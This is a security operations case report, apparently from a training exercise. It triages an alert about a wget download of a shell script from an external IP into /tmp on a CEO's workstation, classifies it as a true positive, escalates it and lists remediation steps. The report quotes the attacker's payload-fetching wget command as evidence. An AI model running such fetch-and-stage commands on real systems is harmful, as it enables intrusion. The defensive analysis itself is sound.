# Alert 1007: Download File To Potentially Suspicious Directory Via Wget

## Incident Classification

**True Positive**

## Escalation Required?

**Yes**

## Case Report

### Time of Activity

`09/08/2026 19:58:35.445`

### Affected Entities

| Entity | Details |
| :--- | :--- |
| **User** | `michael.ascot` — CEO |
| **Host** | `Lin-001` — `192.168.0.10` |
| **Current Directory** | `/tmp` |
| **External Source** | `159.65.241.15` |

### Reason for Classifying as True Positive

The alert was triggered when the `wget` utility was used on `Lin-001` to download a shell script named `installer.sh` from the external IP address `159.65.241.15`:

`wget https://159.65.241.15/installer.sh`

The file was downloaded while operating from the `/tmp` directory, which is commonly used for temporary files and can be abused to stage malicious payloads.

The asset inventory identifies `Lin-001` (`192.168.0.10`) as the workstation assigned to **Michael Ascot, CEO**. More importantly, the SOC handover notes state that an **anomalous login for Michael was previously detected on the VNC-enabled Lin-001 system** and that the host should be monitored more closely.

The combination of the previously identified anomalous VNC login and the subsequent download of a shell script directly from an external IP address indicates that `Lin-001` may have been compromised and that the activity represents **malicious post-compromise execution**.

### Reason for Escalating the Alert

Escalation is required because this activity is connected to the **previous anomalous VNC login on Lin-001** documented in the SOC handover notes and may represent part of a larger attack chain.

An external shell script has now been downloaded to the compromised workstation, indicating that the threat actor may be attempting to stage or execute additional malicious tooling. According to the SOC escalation guidelines, True Positive alerts connected to other alerts within the same attack chain require escalation.

### Recommended Remediation Actions

- Immediately isolate `Lin-001` from the corporate network to prevent further malicious activity or lateral movement.
- Investigate the previously identified anomalous VNC login and correlate it with the activity in this alert.
- Retrieve and analyze `installer.sh` to determine its functionality and identify additional indicators of compromise.
- Block communication with `159.65.241.15` at the perimeter firewall.
- Review authentication and VNC logs associated with `michael.ascot` for evidence of unauthorized access.
- Reset potentially compromised credentials associated with Michael Ascot.
- Continue monitoring for additional activity originating from `Lin-001` or involving `159.65.241.15`.

## Analyst Verdict

**Classification:** True Positive  
**Escalation:** Yes

The alert was confirmed as **suspicious payload download activity on a potentially compromised workstation**. `Lin-001`, assigned to CEO Michael Ascot, had already been associated with an anomalous VNC login documented in the SOC handover notes. The subsequent download of `installer.sh` from external IP `159.65.241.15` into `/tmp` strongly indicates continued post-compromise activity. Because the event forms part of a larger suspected attack chain, immediate escalation and investigation are required.
